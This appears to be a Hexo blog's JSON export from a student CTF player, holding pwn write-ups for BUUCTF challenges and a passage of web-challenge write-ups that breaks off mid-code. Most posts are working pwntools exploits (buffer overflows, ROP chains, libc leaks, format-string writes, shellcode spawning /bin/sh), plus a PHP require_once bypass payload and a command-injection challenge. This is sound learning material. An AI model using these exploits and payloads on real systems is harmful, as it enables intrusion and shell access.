{"meta":{"title":"pz1o","subtitle":"pz1o","description":"CTFer,CUMT","author":"pz1o","url":"https://pz1o.top","root":"/"},"pages":[{"title":"tags","date":"2020-11-20T16:08:29.622Z","updated":"2020-11-20T16:08:29.622Z","comments":true,"path":"tags/index.html","permalink":"https://pz1o.top/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2020-11-29T14:28:48.417Z","updated":"2020-11-29T14:28:48.417Z","comments":true,"path":"about/index.html","permalink":"https://pz1o.top/about/index.html","excerpt":"","text":"CUMT大二在读💻 业余混子😴… 正在学习PWN🐱‍👤 ddl选手🐱‍🏍"},{"title":"categories","date":"2020-11-20T16:07:59.159Z","updated":"2020-11-20T16:07:59.159Z","comments":true,"path":"categories/index.html","permalink":"https://pz1o.top/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"BUU(PWN)","slug":"BUU-PWN","date":"2100-01-23T06:22:39.000Z","updated":"2021-02-07T07:03:52.612Z","comments":true,"path":"2100/01/23/BUU-PWN/","link":"","permalink":"https://pz1o.top/2100/01/23/BUU-PWN/","excerpt":"","text":"寒假开始刷题 BUU（栈）warmup_csaw_2016123456789101112#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#node3.buuoj.cn:28301r = remote(\"node3.buuoj.cn\",28301)#r = process(\"\")payload = b'A'*(0x40+0x8) + p64(0x40060d)r.sendline(payload)r.interactive() pwn1_sctf_20161234567891011#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *r = remote(\"node3.buuoj.cn\",28698)#r = process(\"./pwn1_sctf_2016\")payload = b'I'*20 + b'A'*0x4 + p32(0x08048F0D)r.sendline(payload)r.interactive() [第六章 CTF之PWN章]stack1234567891011#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *r = remote(\"node3.buuoj.cn\",26846)#r = process(\"./stack\")payload = b'A'*(0xA+0x8) + p64(0x400537)r.sendline(payload)r.interactive() [第六章 CTF之PWN章]ROP（64位系统调用）64位的系统调用 &gt;&gt;&gt; 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *p&#x3D;process(&#39;.&#x2F;rop&#39;)elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)libc &#x3D; elf.libcpop_rdi &#x3D; 0x4005d3puts_got &#x3D; 0x601018puts &#x3D; 0x400430main &#x3D; 0x400537rop1 &#x3D; &quot;a&quot;*18rop1 +&#x3D; p64(pop_rdi)rop1 +&#x3D; p64(puts_got)rop1 +&#x3D; p64(puts)rop1 +&#x3D; p64(main)p.sendline(rop1)p.recvuntil(&#39;\\n&#39;)addr &#x3D; u64(p.recv(6).ljust(8,&#39;\\x00&#39;))libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]info(&quot;libc:0x%x&quot;,libc_base)pop_rax &#x3D; 0x00000000000439c8 + libc_basepop_rdi &#x3D; 0x000000000002155f + libc_basepop_rsi &#x3D; 0x0000000000023e6a + libc_basepop_rdx &#x3D; 0x0000000000001b96 + libc_basesyscall &#x3D; 0x00000000000d2975 + libc_basebinsh &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_baserop2 &#x3D; &quot;a&quot;*18rop2 +&#x3D; p64(pop_rax)rop2 +&#x3D; p64(59)rop2 +&#x3D; p64(pop_rdi)rop2 +&#x3D; p64(binsh)rop2 +&#x3D; p64(pop_rsi)rop2 +&#x3D; p64(0)rop2 +&#x3D; p64(pop_rdx)rop2 +&#x3D; p64(0)rop2 +&#x3D; p64(syscall) p.recvuntil(&quot;hello\\n&quot;)p.sendline(rop2)p.interactive() ciscn_2019_n_1浮点数在内存中的存储 12345678#include&lt;stdio.h&gt;int main()&#123; float a &#x3D; 11.28125; unsigned char* p &#x3D; (unsigned char*)&amp;a; printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));&#125; 12345678910111213#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#r = remote(\"\")r = remote(\"node3.buuoj.cn\",29611)payload = 'A'*(0x2c) + \"\\x00\\x80\\x34\\x41\"r.sendline(payload)r.interactive() jarvisoj_level012345678910111213#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *#r &#x3D; remote(&quot;&quot;)r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)r.sendline(payload)r.interactive() ciscn_2019_c_1（64位的puts泄露）本地可以打通 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *#r = remote(\"\")p = remote(\"node3.buuoj.cn\",29957)p = process(\"./pwn3\")elf = ELF(\"./pwn3\")libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_addr = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83p.recvuntil(\"Input your choice!\\n\")p.sendline('1')p.recvuntil(\"Input your Plaintext to be encrypted\\n\")payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)p.sendline(payload)p.recvline()p.recvline()puts=u64(p.recv(6)+'\\x00\\x00')log.info(\"libc base 0x%x\",puts-libc.symbols['puts'])libc_base = puts-libc.symbols['puts']system_addr = libc_base + libc.symbols['system']bin_sh_addr = libc_base + next(libc.search(\"/bin/sh\"))print(next(libc.search(\"/bin/sh\")))payload2=b'A'*0x58+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)p.sendline(payload2)p.interactive() 太废物了 后来看了题解原来是18上面 用libcsearcher 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context.os='linux'#context.log_level='debug'ru=lambda x:p.recvuntil(x)rl=lambda :p.recvline()sl=lambda x:p.sendline(x)sla=lambda x,y:p.sendlineafter(x,y)#r = remote(\"\")p = remote(\"node3.buuoj.cn\",27415)#p = process(\"./pwn3\")elf = ELF(\"./pwn3\")libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_plt = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83ret = 0x4006b9payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)sla(\"Input your choice!\\n\",\"1\")ru(\"Input your Plaintext to be encrypted\\n\")sl(payload)rl()rl()puts = u64(ru('\\n')[:-1].ljust(8,'\\0'))libc = LibcSearcher(\"puts\",puts)print(libc)libc_base = puts-libc.dump(\"puts\")log.info(\"libc base 0x%x\",libc_base)system_addr = libc_base + libc.dump(\"system\")bin_sh_addr = libc_base + libc.dump(\"str_bin_sh\")payload2=b'A'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)sl(payload2)p.interactive() 这里需要注意 18的ubuntu执行system会进行堆栈平衡 解决办法是加ret指令 [OGeek2019]babyrop（32位puts泄露）打通 12345678910111213141516171819202122232425262728293031323334#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;ru&#x3D;lambda x:p.recvuntil(x)rl&#x3D;lambda :p.recvline()sl&#x3D;lambda x:p.sendline(x)sla&#x3D;lambda x,y:p.sendlineafter(x,y)#r &#x3D; remote(&quot;&quot;)p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)#p &#x3D; process(&quot;.&#x2F;pwn&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)payload &#x3D; b&#39;\\x00&#39;*7 + b&#39;\\xff&#39;main &#x3D; 0x8048825sl(payload)puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)sla(&quot;Correct\\n&quot;,payload2)puts &#x3D; u32(p.recv(4))log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))sl(payload)payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)sla(&quot;Correct\\n&quot;,payload3)p.interactive() [第五空间2019 决赛]PWN5（格式化字符串漏洞）1234567891011121314151617181920212223#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;ru&#x3D;lambda x:p.recvuntil(x)rl&#x3D;lambda :p.recvline()sl&#x3D;lambda x:p.sendline(x)sla&#x3D;lambda x,y:p.sendlineafter(x,y)#r &#x3D; remote(&quot;&quot;)p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)#p &#x3D; process(&quot;.&#x2F;pwn&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;sl(payload)#print(p.recv())sl(b&#39;8&#39;)p.interactive() [BJDCTF 2nd]r2t3一开始准备\\x00发现不可以 unsigned __int8:表示无符号一个字节 那么这里就可以溢出了，可以看下面这个eg 12345678910&gt;#include&lt;stdio.h&gt;&gt;int main()&gt;&#123; char a &#x3D; 0x100;printf(&quot;%d\\n&quot;,a-1);printf(&quot;%d\\n&quot;,a);printf(&quot;%d&quot;,a+1);&gt;&#125;&gt;输出结果为 -1 0 1 为什么中间是0呢？ 因为char是1字节，最大为0xff也就是-1， 继续加+1，就是0x100，已经超过0xff，就会丢弃，变成0 12345678910111213141516171819202122232425262728293031#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)ret &#x3D; 0x080483bemain &#x3D; 0x804863bsystem &#x3D; 0x804858bpayload &#x3D; b&#39;A&#39;*0x15 + p32(system)payload &#x3D; payload.ljust(260,b&#39;A&#39;)sl(payload)itr() get_started_3dsctf_2016 好家伙,这题真是开眼了 先说第一种方法 12345678910111213141516171819202122232425262728293031#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)system &#x3D; 0x80489b8payload &#x3D; &#39;a&#39;*56payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)sleep(0.1)sl(payload)print(p.recv()) 这里主要是gets这个函数没有退出，所以需要exit来强制退出，之后读flag就行 第二中 静态链接应该想到ret2syscall 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *context.os='linux'#context.log_level='debug's = lambda data :p.send(str(data))sa = lambda delim,data :p.sendafter(str(delim), str(data))sl = lambda data :p.sendline(str(data))sla = lambda delim,data :p.sendlineafter(str(delim), str(data))r = lambda num=4096 :p.recv(num)ru = lambda delims, drop=True :p.recvuntil(delims, drop)itr = lambda :p.interactive()uu32 = lambda data :u32(data.ljust(4,'\\0'))uu64 = lambda data :u64(data.ljust(8,'\\0'))leak = lambda name,addr :log.success('&#123;&#125; = &#123;:#x&#125;'.format(name, addr))pop_eax_ret = 0x080b91e6pop_edx_ecx_ebx_ret = 0x0806fc30int_0x80 = 0x0806d7e5read_addr = 0x0806E140gets_addr = 0x0804F630pop_ebx_ret = 0x080481ad #0x080481ad : pop ebx ; retmain_addr = 0x08048A20bss_addr = 0x080ECD70p = remote(\"node3.buuoj.cn\",26722)p = process(\"./pwn4\")elf = ELF(\"./pwn4\")libc = ELF('./libc-2.23.so')payload = b'A'*56 + p32(gets_addr) + p32(main_addr) + p32(bss_addr)sl(payload)sl(b\"/bin/sh\")payload2 = b\"A\"*0x38 + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) +p32(bss_addr) + p32(int_0x80)sl(payload2)itr() ciscn_2019_en_2原题 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *context.os='linux'#context.log_level='debug'ru=lambda x:p.recvuntil(x)rl=lambda :p.recvline()sl=lambda x:p.sendline(x)sla=lambda x,y:p.sendlineafter(x,y)#r = remote(\"\")p = remote(\"node3.buuoj.cn\",29937)#p = process(\"./pwn3\")elf = ELF(\"./LibC\")#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')puts_plt = elf.symbols[\"puts\"]puts_got = elf.got[\"puts\"]encrypt = 0x4009a0pop_rdi = 0x400c83ret = 0x4006b9payload = b'A'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)sla(\"Input your choice!\\n\",\"1\")ru(\"Input your Plaintext to be encrypted\\n\")sl(payload)rl()rl()puts = u64(ru('\\n')[:-1].ljust(8,'\\x00'))libc = LibcSearcher(\"puts\",puts)print(libc)libc_base = puts-libc.dump(\"puts\")log.info(\"libc base 0x%x\",libc_base)system_addr = libc_base + libc.dump(\"system\")bin_sh_addr = libc_base + libc.dump(\"str_bin_sh\")payload2=b'A'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)sl(payload2)p.interactive() ciscn_2019_n_8var[13] = ‘\\x11’ 12345678910111213141516171819202122232425#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-from pwn import *context.os&#x3D;&#39;linux&#39;#context.log_level&#x3D;&#39;debug&#39;s &#x3D; lambda data :p.send(str(data))sa &#x3D; lambda delim,data :p.sendafter(str(delim), str(data))sl &#x3D; lambda data :p.sendline(str(data))sla &#x3D; lambda delim,data :p.sendlineafter(str(delim), str(data))r &#x3D; lambda num&#x3D;4096 :p.recv(num)ru &#x3D; lambda delims, drop&#x3D;True :p.recvuntil(delims, drop)itr &#x3D; lambda :p.interactive()uu32 &#x3D; lambda data :u32(data.ljust(4,&#39;\\0&#39;))uu64 &#x3D; lambda data :u64(data.ljust(8,&#39;\\0&#39;))leak &#x3D; lambda name,addr :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)print(payload)sl(payload)itr() jarvisoj_level2sysytem和/bin/sh都有 12345678p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)bin_sh &#x3D; 0x0804A024elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)sys &#x3D; elf.plt[&quot;system&quot;]payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)print(payload)sl(payload)itr() not_the_same_3dsctf_2016（32位write调用）把bss段上的flag直接通过write函数拿出来 12345678p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)bss&#x3D;0x080eca2dpayload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)#print(payload)sl(payload)itr() [BJDCTF 2nd]one_gadget主要来熟悉一下这个东西 one_gadget 有libc基址直接就可以上one_gadget 功能：查找已知的libc中exevce(“/bin/sh”)语句的地址用法: one_gadget libc-x.xx.so 1234567891011121314p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)ru(&quot;here is the gift for u:&quot;)printf &#x3D; int(ru(&#39;\\n&#39;)[2:],16)libcbase &#x3D; printf - libc.sym[&quot;printf&quot;] one_gadget &#x3D; 0x106ef8leak(&quot;printf&quot;,libcbase)sys &#x3D; libcbase + one_gadgetpayload &#x3D; str(sys)sl(payload)itr() bjdctf_2020_babystack123456789p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sl(32)sys &#x3D; 0x4006E6payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)sl(payload)itr() [HarekazeCTF2019]baby_rop12345678910p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sys &#x3D; 0x400490bin_sh &#x3D; 0x601048pop_rdi &#x3D; 0x400683payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() jarvisoj_level2_x6412345678910p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)sys &#x3D; 0x4004C0bin_sh &#x3D; 0x600A90pop_rdi &#x3D; 0x4006b3payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() ciscn_2019_n_5 写shellcode要注意不同架构下 shellcode是不同的 12345678ret &#x3D; 0x4004c9bss &#x3D; 0x601080shellcode &#x3D; asm(shellcraft.sh())print(len(shellcode))sla(&quot;tell me your name\\n&quot;,shellcode)payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)sla(&quot;me?\\n&quot;,payload)itr() ciscn_2019_ne_5 32位puts泄露 但好像put的got表不可以泄露 需要试一试其他的 123456789101112131415161718192021222324252627282930313233343536p = remote(\"node3.buuoj.cn\",29708)def add(log): ru(\"0.Exit\\n:\") sl('1') ru(\"Please input new log info:\") sl(log)def display(): ru(\"0.Exit\\n:\") sl('2')def getflag(): ru(\"0.Exit\\n:\") sl(\"4\")elf = ELF(\"./pwn14\")#libc = ELF(\"./libc-2.27.so\")sl(\"administrator\")puts_plt = elf.symbols['puts']printf_got = elf.got['printf']main = 0x8048722sys = 0x80484D0payload = b'A'*(0x48+0x4) + p32(puts_plt) + p32(main) + p32(printf_got)add(payload)getflag()ru('\\n')printf = uu32(r(4))print(printf)libc = LibcSearcher(\"printf\",printf)libc_base = printf - libc.dump(\"printf\")leak(\"printf\",libc_base)bin_sh = libc_base + libc.dump(\"str_bin_sh\")sl(\"administrator\")payload = b'A'*(0x48+0x4) + p32(sys) + p32(0xdeadbeef) + p32(bin_sh)add(payload)getflag()itr() 铁人三项(第五赛区)_2018_rop(32位write泄露)12345678910111213141516171819p = remote(\"node3.buuoj.cn\",27242)elf = ELF(\"./pwn15\")#libc = ELF(\"./libc-2.27.so\")main = 0x80484C6write_plt = elf.symbols['write']write_got = elf.got['write']payload = b'A'*(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)sl(payload)write = uu32(r(4))libc = LibcSearcher(\"write\",write)libc_base = write - libc.dump(\"write\")leak(\"write\",libc_base)sys = libc_base + libc.dump(\"system\")bin_sh = libc_base + libc.dump(\"str_bin_sh\")payload = b'A'*(0x88+0x4) + p32(sys) + p32(0xdeadbeef) + p32(bin_sh)sl(payload)itr() bjdctf_2020_babyrop(64位puts泄露)1234567891011121314151617181920p = remote(\"node3.buuoj.cn\",27648)elf = ELF(\"./pwn17\")#libc = ELF(\"./libc-2.27.so\")main = 0x4006ADpop_rdi = 0x400733puts_plt = elf.symbols['puts']puts_got = elf.got['puts']payload = b'A'*(0x20+0x8) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) sla(\"Pull up your sword and tell me u story!\\n\",payload)puts = uu64(ru('\\n'))libc = LibcSearcher(\"puts\",puts)libc_base = puts - libc.dump(\"puts\")leak(\"puts\",libc_base)sys = libc_base + libc.dump(\"system\")bin_sh = libc_base + libc.dump(\"str_bin_sh\")payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() others_shellcode连上就有 pwn2_sctf_2016（32位printf泄露） 好像prinf的got表打不通 123456789101112131415161718192021p = remote(\"node3.buuoj.cn\",28222)elf = ELF(\"./pwn19\")#libc = ELF(\"/lib32/libc.so.6\")vuln = 0x804852Fformats = 0x80486A8printf_plt = elf.sym[\"printf\"]atoi_got = elf.got[\"atoi\"]sl(-1)payload = b'A'*(0x2c+0x4) + p32(printf_plt) + p32(vuln) + p32(atoi_got)sl(payload)ru('\\n')ru('\\n')atoi = uu32(r(4))libc = LibcSearcher(\"atoi\",atoi)libc_base = atoi - libc.dump('atoi')sys = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'A'*(0x2c+0x4) + p32(sys) +p32(0xdeadbeef) + p32(bin_sh)sl(-1)sl(payload)itr() [HarekazeCTF2019]baby_rop2(64位printf泄露) 经常会出现泄露printf的got表不行的情况 尽量用其他的 1234567891011121314151617181920p = remote(\"node3.buuoj.cn\",28714)elf = ELF(\"./pwn21\")#libc = ELF(\"./libc-2.27.so\")vuln = 0x400636pop_rdi = 0x400733ret = 0x4004d1printf_plt = elf.sym[\"printf\"]read_got = elf.got[\"read\"]payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) sl(payload)ru('\\n')read = uu64(ru(\"What's\"))libc = LibcSearcher(\"read\",read)libc_base = read - libc.dump('read')sys = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'A'*(0x20+0x8) + p64(pop_rdi) + p64(bin_sh) + p64(sys)sl(payload)itr() ez_pz_hackover_201612345678910p = remote(\"node3.buuoj.cn\",28640)elf = ELF(\"./pwn22\")ru(\"Yippie, lets crash: \")stack = int(ru('\\n'),16)#print(stack)#libc = ELF(\"./libc-2.27.so\")shellcode = asm(shellcraft.sh())payload = \"crashme\\x00\" + b'A'*(0x16-8+4) + p32(stack-0x1c) + shellcodesl(payload)itr()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"复现wp","slug":"复现wp","date":"2099-09-28T02:18:17.000Z","updated":"2020-11-20T14:19:52.357Z","comments":true,"path":"2099/09/28/复现wp/","link":"","permalink":"https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/","excerpt":"","text":"Hitcon2017 babyfirst-revenggithub复现地址 https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge 考点命令执行构造反弹shell 源码如下： 12345678910&lt;?php $sandbox = '/www/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__); 先说几个知识点： 1234&gt;e\\&gt;cho\\&#39;123&#39;&gt;123 在linux中换行可以执行间断的命令 1234567&gt;root@kali:~# vi 1 //在1下写入cat flag.txt&gt;root@kali:~# touch flag.txt&gt;root@kali:~# echo \"cumtctf&#123;i_am_so_cute&#125;\" &gt;&gt; flag.txt&gt;root@kali:~# cat flag.txt&gt;cumtctf&#123;i_am_so_cute&#125;&gt;root@kali:~# sh 1&gt;cumtctf&#123;i_am_so_cute&#125; 在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过sh filename来执行文本里面的系统命令，如果有报错的话会自动跳过 CUMTCTF2020Web简单的文件包含？考点require_once绕过 源码如下 1234567891011&lt;?phpif ($_SERVER['HTTP_CLIENT_IP'] != '127.0.0.1' &amp;&amp; $_SERVER['HTTP_X_REAL_IP'] != '127.0.0.1')&#123; if ($_SERVER['HTTP_X_FORWARDED_FOR'] == \"127.0.0.1\") &#123; die(\"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive\"); &#125; die(\"Sorry, this site is only optimized for those who comes from localhost\"); &#125;show_source(__FILE__);include_once(\"flag.php\");if(isset($_POST['f'])) include_once($_POST['f']); 这里主要问题是reuqire_once的问题 https://www.anquanke.com/post/id/213235#h3-2 这里面的源码解析有得还是看不懂，日后再翻 首先说一下php文件包含的机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。 payload 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php /proc/self指向当前进程的/proc/pid/ /proc/self/root/指向/的符号 👍🙌😃考点代码格式化、反混淆，bcrypt爆破，命令执行 这个题 我只能说真的牛逼 真的开眼界 还可以这样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phprequire 'vendor/autoload.php';use Bcrypt\\Bcrypt;highlight_file(__FILE__);ini_set(\"display_errors\",\"Off\");$🙐=array('🙐','🙑','🙒','🙓','🙔','🙕','🙖','🙗','🙘','🙙','🙚','🙛','🙜','🙝','🙞','🙟');$🙠=array('🙠','🙡','🙢','🙣','🙤','🙥','🙦','🙧','🙨','🙩','🙪','🙫','🙬','🙭','🙮','🙯');$🙰=array('🙰','🙱','🙲','🙳','🙴','🙵','🙶','🙷','🙸','🙹','🙺','🙻','🙼','🙽','🙾','🙿');$😀=array('😀','😁','😂','😃','😄','😅','😆','😇','😈','😉','😊','😋','😌','😍','😎','😏');$😐=array('😐','😑','😒','😓','😔','😕','😖','😗','😘','😙','😚','😛','😜','😝','😞','😟');$😠=array('😠','😡','😢','😣','😤','😥','😦','😧','😨','😩','😪','😫','😬','😭','😮','😯');$😰=array('😰','😱','😲','😳','😴','😵','😶','😷','😸','😹','😺','😻','😼','😽','😾','😿');$🙀=array('🙀','🙁','🙂','🙃','🙄','🙅','🙆','🙇','🙈','🙉','🙊','🙋','🙌','🙍','🙎','🙏');$🏁 = array($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);$😳😃😢🙉😲😗😦🙅 = \"strlen\";$😩😂😸🙉 = \"chr\";$🎁 = \"base64_decode\";$😱😨😞🙊😪😨😡😍 = \"isset\";function 😪😗😦😺😲😂😢😼($😳😃😢🙉) &#123; global $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍; $😲😗😦🙅= (\"$😳😃😢🙉😲😗😦🙅\")($😳😃😢🙉)/4; $😳😂😚😼 